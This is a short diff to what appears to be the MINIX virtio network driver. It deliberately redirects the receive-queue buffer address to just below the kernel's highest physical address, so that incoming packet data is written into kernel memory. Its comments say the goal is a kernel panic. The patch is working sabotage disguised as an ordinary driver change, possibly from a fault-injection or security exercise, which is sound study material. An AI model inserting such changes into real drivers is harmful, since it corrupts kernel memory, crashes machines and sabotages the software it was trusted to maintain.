@@ -19,6 +19,11 @@
 
 #include "virtio_net.h"
 
+
+//Additional includes
+#include <stdio.h>
+#include <minix/param.h>
+
 #define VERBOSE 0
 
 #if VERBOSE
@@ -231,6 +236,14 @@ virtio_net_refill_rx_queue(void)
 		phys[1].vp_addr = p->pdata;
 		assert(!(phys[1].vp_addr & 1));
 		phys[1].vp_size = MAX_PACK_SIZE;
+
+		// Get Kernel Info so we know where to Insert our data to get kernel panic
+		struct kinfo kinfo;
+  		int s;
+		if (OK != (s=sys_getkinfo(&kinfo))) {
+			panic("Couldn't get kernel information: %d", s);
+		}
+		phys[1].vp_addr = kinfo.mem_high_phys -100; //Need -100 since this represents the highest adress of the kernel. 100 is an arbitary number we just need to get into kernel space
 
 		/* RX queue needs write */
 		phys[0].vp_addr |= 1;
